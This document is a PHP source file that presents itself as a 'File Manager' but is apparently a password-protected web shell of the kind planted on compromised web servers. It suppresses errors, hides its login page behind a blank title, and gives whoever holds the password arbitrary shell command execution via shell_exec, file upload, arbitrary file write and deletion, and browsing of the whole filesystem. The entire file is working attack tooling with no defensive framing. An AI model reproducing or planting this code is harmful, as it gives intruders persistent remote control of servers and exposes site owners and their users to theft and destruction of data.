<?php
error_reporting(0);

$password="2e1dc1e85d14d66795c0172b921f114be2cc44d5";

function login() {
    echo '<html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=0.70">
        <title></title>
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
        <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous" />
        <link rel="icon" href="https://d.top4top.io/p_1748iokq91.png">
    </head>
<body class="bg-secondary">
<form method="POST">
    <div class="container-fluid">
        <div class="py-3" id="main">
            <div class="input-group">
                <div class="input-group-text"><i class="fa fa-user-circle"></i></div>
                <input class="form-control form-control-sm" type="password" placeholder="password" name="password" required>
                <button class="btn btn-outline-light btn-sm"><i class="fa fa-sign-in"></i></button>
            </div>
        </div>
    </div>
</form>
</body>
</html>';
exit;
}

if(!isset($_COOKIE[sha1($_SERVER['HTTP_HOST'])])) {
    if(empty($password) || (isset($_POST['password']) && (sha1($_POST['password']) == $password))) {
        setcookie(sha1($_SERVER['HTTP_HOST']), true);
    } else {
        login();
    }
}

$current_dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
$parent_dir = dirname($current_dir);

if (isset($_POST['delete'])) {
    $delete_item = $_POST['item'];
    if (is_file($delete_item)) {
        unlink($delete_item);
    } elseif (is_dir($delete_item)) {
        rmdir($delete_item);
    }
}

if (isset($_POST['create_folder'])) {
    $folder_name = $_POST['folder_name'];
    mkdir($current_dir . '/' . $folder_name);
}

if (isset($_POST['upload'])) {
    $upload_file = $_FILES['file_to_upload'];
    move_uploaded_file($upload_file['tmp_name'], $current_dir . '/' . $upload_file['name']);
}

if (isset($_POST['save_file'])) {
    $file_name = $_POST['file_name'];
    $file_content = $_POST['file_content'];
    if (file_put_contents($file_name, $file_content) !== false) {
        echo "<div class='alert alert-success'>File berhasil disimpan.</div>";
    } else {
        echo "<div class='alert alert-danger'>Gagal menyimpan file.</div>";
    }
}

$output = '';
if (isset($_POST['terminal_command'])) {
    $command = $_POST['terminal_command'];
    $output = shell_exec("cd $current_dir && $command");
}

function list_files($dir) {
    $files = scandir($dir);
    $output = '';
    foreach ($files as $file) {
        if ($file != '.' && $file != '..') {
            $file_path = $dir . '/' . $file;

            $permissions = fileperms($file_path);
            $permissions_octal = substr(sprintf('%o', $permissions), -4);

            $is_writable = is_writable($file_path);

            $permission_color = $is_writable ? 'style="color: green;"' : 'style="color: red;"';

            $owner = fileowner($file_path);
            $owner_name = posix_getpwuid($owner)['name'];

            // Get the last modified date
            $last_modified = date("Y-m-d H:i:s", filemtime($file_path));

            $output .= "<tr><td><a href='?dir=" . urlencode($file_path) . "'>$file</a></td><td>";
            
            if (is_dir($file_path)) {
                $output .= "Folder</td><td>";
            } else {
                $output .= "File</td><td>";
            }

            $output .= "<span $permission_color>$permissions_octal</span></td><td>$owner_name</td><td>$last_modified</td><td>";
            
            if (is_dir($file_path)) {
                $output .= "<form method='post' action=''><input type='hidden' name='item' value='$file_path'><input type='submit' name='delete' value='Delete' class='btn btn-danger'></form>";
            } else {
                $output .= "<form method='post' action=''><input type='hidden' name='item' value='$file_path'><input type='submit' name='delete' value='Delete' class='btn btn-danger'></form>";
            }
            $output .= "</td></tr>";
        }
    }
    return $output;
}




?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Manager</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            margin: 30px;
            background-color: #f4f4f4;
            color: #333;
        }
        h1, h2 {
            color: #007bff;
        }
        a {
            color: #007bff;
            text-decoration: none;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }
        table, th, td {
            border: 1px solid #ddd;
        }
        th, td {
            padding: 15px;
            text-align: left;
        }
        th {
            background-color: #f8f9fa;
        }
        .btn {
            padding: 6px 12px;
            cursor: pointer;
            border: none;
            border-radius: 4px;
        }
        .btn-danger {
            background-color: #dc3545;
            color: white;
        }
        .btn-danger:hover {
            background-color: #c82333;
        }
        .form-container {
            background-color: #ffffff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
            margin-bottom: 20px;
        }
        input[type="text"], input[type="file"] {
            padding: 10px;
            margin: 5px 0;
            width: 100%;
            border-radius: 4px;
            border: 1px solid #ccc;
            box-sizing: border-box;
        }
        input[type="submit"] {
            padding: 10px 15px;
            background-color: #28a745;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        input[type="submit"]:hover {
            background-color: #218838;
        }
        .go-up {
            display: inline-block;
            padding: 8px 15px;
            background-color: #007bff;
            color: white;
            border-radius: 4px;
            text-decoration: none;
            margin-bottom: 20px;
        }
        .go-up:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>

    <h1>File Manager - Current Directory: <?php echo htmlspecialchars($current_dir); ?></h1>

    <a href="?dir=<?php echo urlencode($parent_dir); ?>" class="go-up">Go Up</a>

    <div class="form-container">
        <h2>Create Folder</h2>
        <form method="post" action="">
            <input type="text" name="folder_name" placeholder="Folder name" required>
            <input type="submit" name="create_folder" value="Create Folder">
        </form>
    </div>

    <div class="form-container">
        <h2>Upload File</h2>
        <form method="post" action="" enctype="multipart/form-data">
            <input type="file" name="file_to_upload" required>
            <input type="submit" name="upload" value="Upload File">
        </form>
    </div>

    <div class="form-container">
        <h2>Terminal Command</h2>
        <form method="post" action="">
            <input type="text" name="terminal_command" placeholder="Enter terminal command" required>
            <input type="submit" value="Execute Command">
        </form>
    </div>

    <?php if ($output): ?>
        <h3>Command Output:</h3>
        <pre><?php echo htmlspecialchars($output); ?></pre>
    <?php endif; ?>

    <h2>Files & Folders</h2>
    <table>
        <thead>
            <tr>
                <th>Name</th>
                <th>Type</th>
                <th>Permission</th>
                <th>Owner</th>
                <th>Last Modified</th>
                <th>Actions</th>
            </tr>
        </thead>
        <tbody>
            <?php echo list_files($current_dir); ?>
        </tbody>
    </table>

</body>
</html>
